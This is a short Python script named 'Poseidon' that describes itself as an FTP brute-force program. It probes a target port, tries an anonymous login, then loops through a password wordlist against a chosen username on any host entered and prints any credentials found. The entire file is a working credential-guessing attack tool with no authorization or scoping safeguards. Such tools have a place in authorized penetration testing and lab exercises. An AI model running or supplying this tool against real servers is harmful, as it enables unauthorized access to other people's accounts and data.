import ftplib
import time
import socket
import sys
import pyfiglet
import signal

#### Capture CTRL+C/SIGINT and exit gracefully
def handler(signum, frame):
    print ('Interrupted by user')
    exit (0)

#### Formar for print ####
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

#### Connect to remote FTP Server
def connect(host,port,user,password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host,port)
        ftp.login(user,password)
        ftp.quit()
        return True
    except:
        return False

#### Check if port is open on remote Server ####
def check_FTP_port(host, port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    result = sock.connect_ex((host, port))
    if result == 0:
        print (bcolors.OKGREEN + '[*] FTP Service is available')
        return True
    else:
        print (bcolors.FAIL + '[*] FTP Service is unavailable')
        return False
    time.sleep(1.9)
    sock.close()

#### Check if File exist ####
def file_exist():
    file = input(bcolors.OKCYAN + '[+] Enter path to password collection: ')
    try:
        return open(file, 'r')
    except FileNotFoundError:
        print(bcolors.FAIL + '[*] Unable to locate ' + file)


def main():
    signal.signal(signal.SIGINT, handler)
    print (pyfiglet.figlet_format("POSEIDON"))
    print (bcolors.OKCYAN + '[+] Welcome to Poiseidon, an FTP Brute-Force Program!')
    # Variables
    host = input(bcolors.OKCYAN + '[+] Enter a Host: ')
    port = int(input(bcolors.OKCYAN + '[+] Enter Remote Port: '))

    #Checking if FTP Service is available
    print(bcolors.OKCYAN + '[+] Checking FTP Port ' + str(port) + ' on ' + host)
    time.sleep(1.5)
    if(check_FTP_port(host,port)):
        # Connect with Anonymous User
        print (bcolors.OKCYAN + '[+] Attempt to Connect to FTP Server...')
        time.sleep(1.5)
        print (bcolors.OKCYAN + '[+] Checking Anonymous User...')
        time.sleep(2.5)
        if connect(host, port, 'anonymous', 'anonymous'):
            print (bcolors.OKGREEN + '[*] Login Successful!!')
            print (bcolors.OKGREEN + '[*] FTP Anonymous Log on allow on host ' + host)
        else:
            print (bcolors.FAIL + '[*] Cannot connect using Anonymous account')
            time.sleep(1.9)
            # Start brute-force when Anonymous user cannot connect
            print (bcolors.OKCYAN + '[+] Start Brute-Forcing FTP Server...')
            time.sleep(1.2)
            username = input(bcolors.OKCYAN + '[+] Enter a Username: ')
            openFile = file_exist()
            print (bcolors.OKCYAN + '[+] Opening password collection...')
            time.sleep(2)

            ### Start going through all passwords ###
            for line in openFile:
                print(bcolors.OKCYAN + '[+] Trying ' + username + ':' + line.strip() + '...')
                if connect(host,port,username,line.strip()):
                    print (bcolors.OKGREEN + '[*] Account Found!!! ' + username + ':' + line.strip())
                    sys.exit()
            print (bcolors.FAIL + '[*] Unable to to find credentials. Exiting...')
            openFile.close()
            sys.exit()
    else:
        sys.exit('Unable to connect ' + host + ' on port ' + str(port))

if __name__ == '__main__':
	main()
